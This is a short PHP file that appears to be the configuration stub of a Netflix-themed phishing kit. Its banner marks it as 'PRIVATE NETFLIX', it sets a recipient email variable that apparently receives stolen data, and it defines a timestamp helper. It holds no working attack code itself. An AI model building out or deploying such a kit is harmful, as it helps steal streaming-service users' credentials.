﻿<?php 
/*
___________.____    ._________________________
\_   _____/|    |   |   \__    ___/\_   _____/
 |    __)_ |    |   |   | |    |    |    __)_ 
 |        \|    |___|   | |    |    |        \
/_______  /|_______ \___| |____|   /_______  /
        \/         \/                      \/ UGEYO SP
        ||PRIVATE N|E|T|F|l|I|X 
        || ®RESERVED TO: UGEYO SP 
*/
	
	// HHH ZEPek
	$yours = "mail@gmail.com";
	// HHH ZEPek

	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}?>
